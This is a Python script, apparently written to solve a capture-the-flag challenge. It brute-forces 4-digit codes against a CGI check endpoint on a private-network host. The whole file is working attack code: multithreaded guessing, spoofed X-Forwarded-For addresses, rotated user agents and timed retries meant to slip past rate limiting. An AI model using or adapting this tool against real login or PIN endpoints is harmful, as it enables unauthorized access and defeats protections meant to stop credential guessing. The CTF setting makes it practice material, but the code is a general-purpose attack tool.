#!/usr/bin/env python3

import requests
import threading
import time
import random
import queue

# ================= CONFIG =================
TARGET_URL = "http://10.66.182.15:8080/cgi-bin/psych_check.sh"
WORDLIST_FILE = "psych_4digit.txt"

NUM_THREADS = 4          # 4 threads works well with 20–30s limits
BASE_SLEEP = 7           # Base delay per thread
RATE_LIMIT_SLEEP = 30    # Observed cooldown window

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "curl/7.68.0",
    "CTFScanner/1.0"
]

# =========================================

code_queue = queue.Queue()
found_flag = threading.Event()

def random_ip():
    return f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"

def worker(thread_id):
    while not code_queue.empty() and not found_flag.is_set():
        try:
            code = code_queue.get_nowait()
        except queue.Empty:
            return

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": random.choice(USER_AGENTS),
            "X-Forwarded-For": random_ip()
        }

        data = f"code={code}"

        # 🔁 RETRY LOOP FOR THIS CODE
        while not found_flag.is_set():
            try:
                r = requests.post(TARGET_URL, headers=headers, data=data, timeout=8)
                j = r.json()

                if j.get("error") == "rate_limit":
                    print(f"[Thread {thread_id}] ⏳ Rate limited on {code}, retrying in {RATE_LIMIT_SLEEP}s")
                    time.sleep(RATE_LIMIT_SLEEP)
                    continue  # retry SAME code

                if j.get("ok"):
                    print("\n" + "="*50)
                    print(f"[✅ SUCCESS] Code found by Thread {thread_id}")
                    print(f"[🔑 Code ] {code}")
                    print(f"[🚩 Flag ] {j.get('flag', 'NO FLAG RETURNED')}")
                    print("="*50 + "\n")
                    found_flag.set()
                    return

                print(f"[Thread {thread_id}] ❌ Invalid code: {code}")
                break  # move to next code

            except Exception as e:
                print(f"[Thread {thread_id}] ⚠️ Network error on {code}: {e}")
                time.sleep(5)

        time.sleep(BASE_SLEEP + random.uniform(1, 3))

def main():
    with open(WORDLIST_FILE, "r") as f:
        for line in f:
            code = line.strip()
            if code:
                code_queue.put(code)

    threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=worker, args=(i + 1,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if not found_flag.is_set():
        print("\n[❌] Finished wordlist — no valid code found.")
    else:
        print("[🎉] Brute-force completed successfully.")

if __name__ == "__main__":
    main()

